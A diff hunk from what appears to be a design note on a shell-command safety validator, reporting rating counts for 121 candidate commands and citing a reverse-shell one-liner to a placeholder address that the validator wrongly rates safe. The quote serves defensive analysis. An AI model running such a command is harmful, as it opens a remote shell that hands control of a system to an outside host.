@@ -139,8 +139,8 @@ tier only and reports the new counts here.
 Running the current static validator (`SafetyConfig::moderate()`) over the
 121 candidates gives 92 `safe`, 10 `moderate`, 5 `high`, 14 `critical`. The
 mismatches against the rules above are the strongest argument for this subset
-and are handed off as a safety-pattern finding
-([`BW-027`](../../.claude/memory/broken-windows.md)), not fixed here:
+and are handed off as a safety-pattern finding (#1559, register entry
+[`BW-027`](../../.claude/memory/broken-windows.md)), not fixed here:
 
 - Rated `safe` by the floor, `critical` by rule 1, 2 or 5:
   `bash -i >& /dev/tcp/203.0.113.7/4444 0>&1`,
